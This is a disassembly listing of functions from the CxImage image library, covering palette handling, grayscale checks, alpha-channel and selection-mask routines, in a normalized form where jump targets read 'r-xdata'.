pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x191 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x18c ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x191 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
add edx 0x28
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] 0x30d40
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18c ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x190 ]
jmp r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x20 ]
jge r-xdata
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov al [ ebp - 0x14 ]
mov [ edx + 0x190 ] al
mov al [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp + 0x8 ]
and edx 0xff
sub ecx edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x1c ]
xor edx edx
mov dl [ eax ]
mov eax [ ebp + 0x8 ]
and eax 0xff
sub edx eax
imul ecx edx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x1c ]
xor eax eax
mov al [ edx + 0x1 ]
mov edx [ ebp + 0x9 ]
and edx 0xff
sub eax edx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x1c ]
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x9 ]
and edx 0xff
sub ebx edx
imul eax ebx
add ecx eax
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x1c ]
xor edx edx
mov dl [ eax + 0x2 ]
mov eax [ ebp + 0xa ]
and eax 0xff
sub edx eax
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x1c ]
xor ebx ebx
mov bl [ eax + 0x2 ]
mov eax [ ebp + 0xa ]
and eax 0xff
sub ebx eax
imul edx ebx
add ecx edx
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x1c ]
add ecx 0x4
mov [ ebp - 0x1c ] ecx
?RGBtoBGR@CxImage@@IAEXPAEH@Z
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x50 ]
mov ecx 0x14
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx [ ecx + 0x30 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp + 0xc ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp + 0xc ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0xc ]
mov cl [ eax ]
mov [ ebp - 0x8 ] cl
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0xc ]
mov cl [ eax + 0x2 ]
mov [ edx ] cl
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0xc ]
mov al [ ebp - 0x8 ]
mov [ edx + 0x2 ] al
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x3
mov [ ebp - 0xc ] ecx
?RGBtoRGBQUAD@CxImage@@QAE?AUtagRGBQUAD@@K@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov al [ ebp + 0xc ]
mov [ ebp - 0x6 ] al
mov ecx [ ebp + 0xc ]
and ecx 0xffff
sar ecx 0x8
mov [ ebp - 0x7 ] cl
mov edx [ ebp + 0xc ]
shr edx 0x10
mov [ ebp - 0x8 ] dl
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
?GetPaletteColor@CxImage@@QAE_NEPAE00@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor al al
mov eax [ ebp + 0x8 ]
and eax 0xff
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov al [ edx + eax * 4 + 0x2 ]
mov [ ecx ] al
mov ecx [ ebp + 0x8 ]
and ecx 0xff
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
mov cl [ eax + ecx * 4 + 0x1 ]
mov [ edx ] cl
mov edx [ ebp + 0x8 ]
and edx 0xff
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x8 ]
mov dl [ ecx + edx * 4 ]
mov [ eax ] dl
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
?SetPalette@CxImage@@QAEXKPAE00@Z
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x54 ]
mov ecx 0x15
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x54
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp + 0x10 ] edx
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp edx [ ecx + 0x28 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x14 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x191 ] 0x0
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax ]
mov [ edx + ecx * 4 + 0x2 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov cl [ ecx ]
mov [ eax + edx * 4 + 0x1 ] cl
mov edx [ ebp + 0x14 ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov dl [ edx ]
mov [ ecx + eax * 4 ] dl
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
?SetPalette@CxImage@@QAEXPAUrgb_color@@K@Z
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x54 ]
mov ecx 0x15
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x54
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
cmp eax [ edx + 0x28 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x191 ] 0x0
mov ecx [ ebp - 0x10 ]
imul ecx ecx 0x3
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov cl [ esi + ecx ]
mov [ eax + edx * 4 + 0x2 ] cl
mov edx [ ebp - 0x10 ]
imul edx edx 0x3
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov dl [ esi + edx + 0x1 ]
mov [ ecx + eax * 4 + 0x1 ] dl
mov eax [ ebp - 0x10 ]
imul eax eax 0x3
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov al [ esi + eax + 0x2 ]
mov [ edx + ecx * 4 ] al
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
?SetPalette@CxImage@@QAEXPAUtagRGBQUAD@@K@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
call ?GetPaletteSize@CxImage@@QAEKXZ
mov edx [ ebp + 0xc ]
shl edx 0x2
cmp eax edx
jae r-xdata
mov eax [ ebp + 0xc ]
shl eax 0x2
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
call ?GetPaletteSize@CxImage@@QAEKXZ
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
push eax
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x191 ] 0x0
?SetGrayPalette@CxImage@@QAEXXZ
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x28 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x28 ]
sub ecx 0x1
mov eax 0xff
xor edx edx
div ecx
mov edx [ ebp - 0xc ]
imul edx eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 + 0x2 ] dl
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov cl [ esi + ecx * 4 + 0x2 ]
mov [ eax + edx * 4 + 0x1 ] cl
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov cl [ esi + ecx * 4 + 0x1 ]
mov [ eax + edx * 4 ] cl
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
?IsGrayScale@CxImage@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x28 ]
jae r-xdata
mov al 0x1
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + edx * 4 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + edx * 4 + 0x1 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + edx * 4 + 0x2 ]
cmp ecx [ ebp - 0xc ]
je r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
?AlphaClear@CxImage@@QAEXXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x10 ]
push eax
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1a0 ]
push edx
call memset
add esp 0xc
?AlphaSet@CxImage@@QAEXE@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
and ecx 0xff
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1a0 ]
push eax
call memset
add esp 0xc
?AlphaCreate@CxImage@@QAEXXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x10 ]
mov esi esp
push eax
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1a0 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x1a0 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
imul edx [ ecx + 0x10 ]
push edx
push 0xff
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1a0 ]
push ecx
call memset
add esp 0xc
?AlphaDelete@CxImage@@QAEXXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1a0 ]
push edx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1a0 ] 0x0
?AlphaCopy@CxImage@@QAE_NAAV1@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0xc ]
cmp eax [ edx + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x1a0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
imul edx [ ecx + 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x1a0 ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov al [ edx + 0x17c ]
mov [ ecx + 0x17c ] al
mov al 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
imul ecx [ eax + 0x10 ]
mov esi esp
push ecx
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
?AlphaSet@CxImage@@QAE_NAAV1@@Z
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x50 ]
mov ecx 0x14
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call ?IsGrayScale@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
cmp edx [ ecx + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x50
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x10 ]
cmp edx [ ecx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1a0 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x10 ]
mov esi esp
push eax
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1a0 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ecx + 0x10 ]
jge r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add edx [ ecx + 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
add ecx [ eax + 0x30 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
?AlphaSet@CxImage@@QAEXJJE@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?IsInside@CxImage@@QAE_NJJ@Z
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
imul ecx [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
add edx ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1a0 ]
mov al [ ebp + 0x10 ]
mov [ ecx + edx ] al
?AlphaGet@CxImage@@QAEEJJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
xor al al
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?IsInside@CxImage@@QAE_NJJ@Z
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
imul ecx [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
add edx ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1a0 ]
mov al [ ecx + edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?SelectionDelete@CxImage@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ecx + 0x16c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ecx + 0x178 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x170 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x174 ] 0x0
mov al 0x1
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x19c ]
push edx
call [ free@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x19c ] 0x0
?SelectionIsInside@CxImage@@QAE_NJJ@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?IsInside@CxImage@@QAE_NJJ@Z
and eax 0xff
test eax eax
je r-xdata
xor al al
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x19c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
imul ecx [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
add edx ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x19c ]
xor eax eax
mov al [ ecx + edx ]
neg eax
sbb eax eax
neg eax
jmp r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?SelectionCopy@CxImage@@QAE_NAAV1@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0xc ]
cmp eax [ edx + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x19c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
imul ecx [ eax + 0x10 ]
mov esi esp
push ecx
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov edx [ ebp - 0x4 ]
mov [ edx + 0x19c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x19c ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x19c ]
push ecx
call memcpy
add esp 0xc
push 0x10
